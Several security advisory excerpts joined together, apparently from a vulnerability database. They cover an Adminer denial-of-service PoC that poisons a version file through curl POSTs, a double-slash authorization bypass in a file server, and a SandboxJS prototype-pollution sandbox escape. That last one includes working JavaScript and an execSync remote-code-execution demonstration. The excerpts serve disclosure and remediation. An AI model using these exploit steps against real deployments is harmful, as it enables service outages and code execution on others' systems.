serialize(array(\"signature\" => $_POST[\"signature\"], \"version\" => $_POST[\"version\"])));\n    }\n    exit;\n}\n```\n\n**3. Type confusion crash:**\n\nWhen POST contains `version[]` instead of `version`, PHP creates an array. When Adminer reads this file and passes to `openssl_verify()`:\n\n```php\n// design.inc.php line 75\nif (openssl_verify($version[\"version\"], base64_decode($version[\"signature\"]), $public) == 1) {\n```\n\nPHP 8.x throws:\n```\nTypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given\n```\n\n### PoC\n\n**Steps to Reproduce:**\n\n**Step 1:** Verify Adminer is running and accessible.\n```bash\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8888/adminer-5.4.1.php\n```\nExpected output:\n```\n200\n```\n\n**Step 2:** Send the malicious POST request. The `version[]` syntax causes PHP to create an array instead of a string.\n```bash\ncurl -X POST \"http://localhost:8888/adminer-5.4.1.php?script=version\" \\\n     -d \"signature=x&version[]=INJECTED\"\n```\nExpected output: Empty response (no error).\n\n**Step 3:** Access Adminer again to trigger the crash.\n```bash\ncurl -s -o /dev/null -w \"%{http_code}\\n\" http://localhost:8888/adminer-5.4.1.php\n```\nExpected output:\n```\n500\n```\n\n**Step 4:** (Optional) View the PHP error in server logs.\n```\nPHP Fatal error:  Uncaught TypeError: openssl_verify(): Argument #1 ($data) must be of type string, array given in adminer-5.4.1.php:1386\n```\n\n**Step 5:** (Optional) Inspect the poisoned file.\n```bash\ncat /tmp/adminer.version\n```\nExpected output:\n```\na:2:{s:9:\"signature\";s:1:\"x\";s:7:\"version\";a:1:{i:0;s:8:\"INJECTED\";}}\n```\n\n**Recovery:**\n```bash\nrm /tmp/adminer.version\n```\nAfter deletion, Adminer returns HTTP 200.\n\n---\n\n### Impact\n\n**Type:** Denial of Service\n\n**Root cause:** The `?script=version` endpoint is designed to receive data from `adminer.org` via JavaScript, but lacks server-side validation. Any HTTP client can POST directly to this endpoint. Combined with missing type validation before `openssl_verify()`, this allows persistent DoS.\n\n**Affected users:** Any Adminer instance accessible over the network.",

By adding multiple slashes (e.g., //private/) to the path, the authorization check fails to match the rule, while the underlying filesystem resolves the path correctly, granting unauthorized access to restricted files.\n\n### Details\nThe vulnerability allows users to bypass \"Disallow\" rules defined by administrators.\n\nThe issue stems from how the application handles URL path normalization and rule matching:\n\n1. Router Configuration: The router in `http/http.go` is configured with `r.SkipClean(true)`. This prevents the automatic collapse of multiple slashes (e.g., // becoming /) before the request reaches the handler.\n2. Insecure Rule Matching: The rule enforcement logic in `rules/rules.go` relies on a simple string prefix match: `strings.HasPrefix(path, r.Path)`. If a rule disallows /private, a request for //private fails this check because //private does not strictly start with /private.\n3. Filesystem Resolution: After bypassing the rule check, the non-normalized path is passed to the filesystem. The filesystem treats the multiple slashes as a single separator, successfully resolving //private/secret.txt and serving the file.\n\n### PoC\n[Python minimal PoC](https://github.com/user-attachments/files/24823114/poc.py)\n\nThe following steps demonstrate the vulnerability:\n1.

When a global prototype reference (e.g., `Map.prototype`, `Set.prototype`) is placed into an array and retrieved, the `isGlobal` taint is stripped, permitting direct prototype mutation from within the sandbox. This results in persistent host-side prototype pollution and may enable RCE in applications that use polluted properties in sensitive sinks (example gadget: `execSync(obj.cmd)`).\n\n### Details\n#### Root Cause:\nThe sandbox implements a protection mechanism using the `isGlobal` flag in the Prop class to prevent modification of global objects and their prototypes. However, this taint tracking is lost when values pass through array/object literal creation.\n\n#### Vulnerable Code Path `src/executor.ts`([L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)):\n```ts\naddOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) => {\n  const items = (b as LispItem[])\n    .map((item) => {\n      if (item instanceof SpreadArray) {\n        return [...item.item];\n      } else {\n        return item;\n      }\n    })\n    .flat()\n    .map((item) => valueOrProp(item, context));  // <- isGlobal flag lost here\n  done(undefined, items);\n});\n```\n#### Exploitation Flow:\n```txt\nSandboxed code: const m=[Map.prototype][0]\n              ↓\nArray creation: isGlobal taint stripped via valueOrProp()\n              ↓\nPrototype mutation: m.cmd='id' (host prototype polluted)\n              ↓\nHost-side impact: new Map().cmd === 'id' (persistent)\n              ↓\nRCE (application-dependent): host code calls execSync(obj.cmd)\n```\n\n#### Protection Bypass Location `src/utils.ts`([L380-L385](https://github.com/nyariv/SandboxJS/blob/main/src/utils.ts#L380-L385)):\n```ts\nset(key: string, val: unknown) {\n  // ...\n  if (prop.isGlobal) {  // <- This check is bypassed\n    throw new SandboxError(`Cannot override global variable '${key}'`);\n  }\n  (prop.context as any)[prop.prop] = val;\n  return prop;\n}\n```\nWhen the prototype is accessed via array retrieval, the `isGlobal` flag is no longer set, so this protection is never triggered.\n\n### PoC\n#### Prototype pollution via array intermediary:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const arr=[Map.prototype];\n  const p=arr[0];\n  p.polluted='pwned';\n  return 'done';\n`)().run();\n\nconsole.log('polluted' in ({}), new Map().polluted);\n```\n**Observed output**: `false pwned`\n\n#### Overwrite `Set.prototype.has`:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const s=[Set.prototype][0];\n  s.has=isFinite;\n  return 'done';\n`)().run();\n\nconsole.log('has overwritten:', Set.prototype.has === isFinite);\n```\n\n**Observed output**: `has overwritten: true`\n\n#### RCE via host gadget (prototype pollution -> execSync):\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst { execSync } = require('child_process');\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const m=[Map.prototype][0];\n  m.cmd='id';\n  return 'done';\n`)().run();\n\nconst obj = new Map();\nconst out = execSync(obj.cmd, { encoding: 'utf8' }).trim();\nconsole.log(out);\n```\n\n**Observed output**: `uid=501(user) gid=20(staff) groups=20(staff),...`\n\n### Impact\nThis is a sandbox escape: untrusted sandboxed code can persistently mutate host built-in prototypes (e.g., `Map.prototype`, `Set.prototype`), breaking isolation and impacting subsequent host execution. RCE is possible in applications that later use attacker-controlled (polluted) properties in sensitive sinks (e.g., passing `obj.cmd` to `child_process.execSync`).\n\n**Affected Systems**: any application using `@nyariv/sandboxjs` to execute untrusted JavaScript.\n\n### Remediation\n- Preserve `isGlobal` protection across array/object literal creation (do not unwrap `Prop` into raw values in a way that drops the global/prototype taint).\n- Add a hard block on writes to built-in prototypes (e.g., `Map.prototype`, `Set.prototype`, etc.) even if they are obtained indirectly through literals.\n- Defense-in-depth: freeze built-in prototypes in the host process before running untrusted code (may be breaking for some consumers).",
